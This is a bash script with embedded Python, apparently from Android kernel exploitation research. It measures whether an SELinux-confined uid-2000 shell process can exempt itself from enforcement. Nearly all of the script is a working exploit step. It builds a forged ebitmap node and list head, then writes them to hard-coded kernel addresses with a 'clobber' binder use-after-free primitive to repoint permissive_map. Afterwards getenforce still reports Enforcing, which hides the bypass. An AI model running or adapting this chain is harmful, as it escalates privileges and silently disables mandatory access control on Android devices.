#!/usr/bin/env bash
# Can a CONFINED uid-2000 process self-exempt itself under Enforcing?
#
# This is the last unknown between "root coexists with Enforcing" (measured) and
# "cold boot with no adb at all": whoever plants the permissive_map must be able to run
# the binder UAF chain *before* any exemption exists.  If the shell domain can do it,
# untrusted_app (627, shared by every third-party app) can almost certainly do it too.
#
# Why two labeled dirs: avc answers come from cached nodes, and ebitmap lookups are only
# consulted on a cache MISS.  So the pre-plant denial must be measured on a label the
# shell has NEVER queried (that miss caches a deny), and the post-plant test must use a
# DIFFERENT never-queried label -- otherwise a stale cached deny would look like "the map
# did not take effect".
#
# usage: selfexempt.sh prep <serial>     while Permissive: create the two probe dirs
#        selfexempt.sh                  default: run the measurement (needs Enforcing)
set -u
MODE=${1:-run}
SER=${2:-3e5a38a5}
ADB="adb -s $SER"
D=/data/local/tmp
NODE_BASE=0xffffffc001635a78
PERM_HEAD=0xffffffc00189f4d0
# label for the pre-plant control and the post-plant probe -- both chosen from
# tools/_type_values.txt as types the shell domain has never touched.  radio_data_file is NOT usable
# here: tools/bootstrap3.sh already makes adb shell stat it, so that avc key is warm (cached deny).
LABEL_A=${LABEL_A:-system_app_data_file}
LABEL_B=${LABEL_B:-drm_data_file}
SHELL_BIT=${SHELL_BIT:-905}

$ADB get-state >/dev/null 2>&1 || { echo "ABORT: no adb"; exit 2; }

if [ "$MODE" = prep ]; then
	[ "$($ADB shell getenforce 2>/dev/null | tr -d '\r')" = Permissive ] || { echo "ABORT: prep needs Permissive"; exit 2; }
	$ADB shell "for X in A B; do rm -rf $D/se\$X; mkdir -p $D/se\$X; touch $D/se\$X/f; chmod 777 $D/se\$X; chmod 666 $D/se\$X/f; done; \
		chcon u:object_r:$LABEL_A:s0 $D/seA; chcon u:object_r:$LABEL_B:s0 $D/seB; ls -Zd $D/seA $D/seB; echo PREP-OK" 2>&1 | tr -d '\r'
	exit 0
fi

E=$($ADB shell getenforce 2>/dev/null | tr -d '\r')
[ "$E" = Enforcing ] || { echo "ABORT: this measures self-exemption from confinement, need Enforcing, got $E"; exit 2; }
# Guard on EXISTENCE only, via a readdir of the parent: any stat of these dirs (ls -d, ls -Zd, stat)
# is itself the MAC-checked operation we are about to measure, so it must not be used as a precondition.
$ADB shell "ls $D 2>/dev/null" 2>&1 | tr -d '\r' | grep -qx seA \
	|| { echo "ABORT: $D/seA missing -- run: $0 prep $SER while Permissive"; exit 3; }
$ADB shell "ls $D 2>/dev/null" 2>&1 | tr -d '\r' | grep -qx seB \
	|| { echo "ABORT: $D/seB missing -- run: $0 prep $SER while Permissive"; exit 3; }

echo "=== 1. confined uid 2000 must be denied on label A (proof we start confined)"
A=$($ADB shell "stat $D/seA/f 2>&1" 2>&1 | tr -d '\r' | head -1)
echo "  stat(seA/f): $A"
case "$A" in *denied*|*Permission*) ;; *) echo "  ABORT: not confined (DAC/MAC setup wrong), nothing to measure"; exit 4;; esac

echo "=== 2. plant a single node for shell($SHELL_BIT) and repoint permissive_map -- as uid 2000, under Enforcing"
eval "$(NODE_BASE=$NODE_BASE BITS=$SHELL_BIT python3 - <<'PY'
import os, struct
base=int(os.environ["NODE_BASE"],16); bits=[int(x) for x in os.environ["BITS"].split(",") if x]
SZ=384
sbit=(max(bits)//SZ)*SZ                      # one node, its startbit is the node's own span
maps=[0]*6
for b in bits:
    if sbit <= b < sbit+SZ:
        off=b-sbit; maps[off//64]|=1<<(off%64)
node=struct.pack("<Q",0)+b"".join(struct.pack("<Q",m) for m in maps)+struct.pack("<I",sbit)
assert len(node)==60; node+=b"\0"*4
head=struct.pack("<Q",base)+struct.pack("<I",max(bits))+struct.pack("<I",0)
assert len(head)==16
def get_bit(e,hb,n):
    if e>hb: return 0
    if n<=e<n+SZ:
        off=e-n; return (maps[off//64]>>(off%64))&1
    return 0
for b in bits: assert get_bit(b,max(bits),sbit)==1, b
for b in (241, 494, 627, 300): assert get_bit(b,max(bits),sbit)==0, b   # ebitmap_get_bit stops at startbit>bit
print("NODE_HEX="+node.hex()); print("HEAD_HEX="+head.hex())
print("PLANT=startbit=%d highbit=%d bytes=%d"%(sbit,max(bits),len(node)))
PY
)"
[ -n "${NODE_HEX:-}" ] || { echo "ABORT: payload build failed"; exit 5; }
echo "  $PLANT (local model: $SHELL_BIT->1, 241/494/627/300->0)"
B4=$($ADB shell "id -u; /data/local/tmp/clobber 14 kern $NODE_BASE hex:$NODE_HEX | grep -c 'PRIMITIVE WORKS'; \
	/data/local/tmp/clobber 14 kern $PERM_HEAD hex:$HEAD_HEX | grep -c 'PRIMITIVE WORKS'" 2>&1 | tr -d '\r')
echo "  as-uid / node-writes / head-writes: $(echo "$B4" | tr '\n' '|')"

echo "=== 3. the map is now consulted on the NEXT cache miss => probe label B (never queried)"
sleep 3
P=$($ADB shell "stat $D/seB/f 2>&1" 2>&1 | tr -d '\r' | head -1)
G=$($ADB shell getenforce 2>/dev/null | tr -d '\r')
echo "  stat(seB/f): $P"
echo "  getenforce: $G"
case "$P" in
  *denied*|*Permission*) echo "  RESULT: still confined => the chain either did not land or a confined process cannot self-exempt";;
  *) [ "$G" = Enforcing ] && echo "  RESULT: PASS -- a confined uid-2000 process self-exempted itself while getenforce says Enforcing" || echo "  RESULT: allowed but getenforce=$G (not a coexistence proof)";;
esac
echo "  note: no avc flush was used (a flush needs SECURITY__SETENFORCE); this relies on the probe key being cold."
